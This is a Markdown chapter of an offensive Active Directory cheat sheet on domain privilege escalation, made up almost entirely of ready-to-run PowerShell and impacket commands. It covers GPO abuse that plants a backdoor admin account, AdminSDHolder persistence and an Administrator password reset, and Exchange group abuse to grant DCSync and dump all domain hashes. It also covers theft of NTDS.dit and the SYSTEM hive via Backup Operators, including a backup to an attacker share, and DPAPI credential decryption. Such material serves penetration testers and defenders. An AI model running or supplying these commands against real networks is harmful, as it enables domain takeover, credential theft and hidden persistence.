# 08 — Domain Privilege Escalation

[← Back to index](README.md)

## 8.1 GPO Abuse

```powershell
# Enumerate GPOs and who can modify them
Get-NetGPO | Select-Object displayName, name, gpcFileSysPath
Get-NetGPOGroup

# Find GPOs applied to specific OU with write access
Get-NetOU -GUID 'GPO_GUID' | Get-NetGPO

# Check ACLs on GPO objects
Get-NetGPO | Get-ObjectAcl -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match 'Write|Modify|FullControl'} |
    Select-Object ObjectDN, IdentityReference, ActiveDirectoryRights

# Enumerate GPO using PowerSploit
Find-GPOComputerAdmin -ComputerName TARGET
Find-GPOLocation -UserName $USER -Verbose

# Modify GPO to add local admin (SharpGPOAbuse on Windows)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount current_user --GPOName 'TARGET GPO'
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName backdoor.bat --ScriptContents 'net user hacker Pass123! /add' --GPOName 'TARGET GPO'

# Force GPO update on target
Invoke-GPUpdate -Computer TARGET -Force
gpupdate /force   # On target machine
```

## 8.2 AdminSDHolder Abuse

AdminSDHolder is a special container that holds the security descriptor template for
protected accounts (Domain Admins, Enterprise Admins, etc.). The SDProp process applies
this template every 60 minutes — overwriting manual ACL changes on protected accounts.

```powershell
# If you have WriteDACL on AdminSDHolder container, you can add persistent ACEs.
# These will propagate to ALL protected accounts every 60 minutes!

# Add GenericAll ACE on AdminSDHolder for current user
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
    -PrincipalIdentity current_user \
    -Rights All -Verbose

# After SDProp runs (up to 60 min), you'll have GenericAll on ALL DA/EA/etc accounts

# Force SDProp to run immediately (requires DA):
Invoke-ADSDPropagation   # Or wait

# Then change DA password
Set-DomainUserPassword -Identity Administrator \
    -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Verbose
```

## 8.3 Exchange / Org Admin Abuse

```powershell
# Exchange Windows Permissions group has WriteDACL on domain!
# If in this group → grant DCSync → dump all hashes

# Check Exchange installation
Get-NetComputer | Where-Object {$_.dnshostname -match 'exchange|mail'} | Select-Object dnshostname

# PrivExchange / CVE-2019-0686 (push notification NTLM relay)
# python3 privexchange.py -ah ATTACKER_IP EXCHANGE_IP -u $USER -p $PASS -d $DOMAIN

# Add user to 'Exchange Windows Permissions' group
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members current_user

# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
    -PrincipalIdentity current_user \
    -Rights DCSync -Verbose
```

```bash
# DCSync
impacket-secretsdump $DOMAIN/current_user:$PASS@$DC_IP -just-dc
```

## 8.4 Backup Operators & SeBackupPrivilege

```powershell
# Check Backup Operators membership
Get-NetGroupMember 'Backup Operators' -Recurse

# Backup Operators can read any file including NTDS.dit!
# SeBackupPrivilege allows bypassing DACL for backup purposes

# Method 1: wbadmin (if on DC)
wbadmin start backup -backuptarget:\\$LHOST\share -include:c:\windows\ntds -quiet

# Method 2: Copy NTDS.dit directly via SeBackupPrivilege
# Use SeBackupPrivilegeUtils.dll
Import-Module SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege c:\windows\ntds\ntds.dit C:\Temp\ntds.dit

# Method 3: DiskShadow (if on DC)
diskshadow /s shadow.txt
# shadow.txt contents:
#   set context persistent nowriters
#   add volume c: alias data
#   create
#   expose %data% z:
robocopy /b z:\windows\ntds C:\Temp ntds.dit

# Also grab SYSTEM hive
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
# Parse offline
impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
```

## 8.5 DPAPI Master Keys & Credentials Files 

```bash
# Copy from file path and download. If files are hidden, try the command. 
gci . force 

# Change the file attribue. 
attrib -s -h FILENAME 
masterKey
credLocal
credRoaming

# After downloading files. Use impacket with current user password. 
impacket-dpapi masterkey -file masterKey -sid S-1-5-21-xxxxx -password '$PASS' 
# Then 
impacket-dpapi credentials -ffile credRoaming -key 0xdaxxxxxxx

```

---

[← Prev: 07 — Lateral Movement Techniques](07-lateral-movement.md) | [Next: 09 — MSSQL Attacks & Linked Server Chains →](09-mssql-attacks.md)
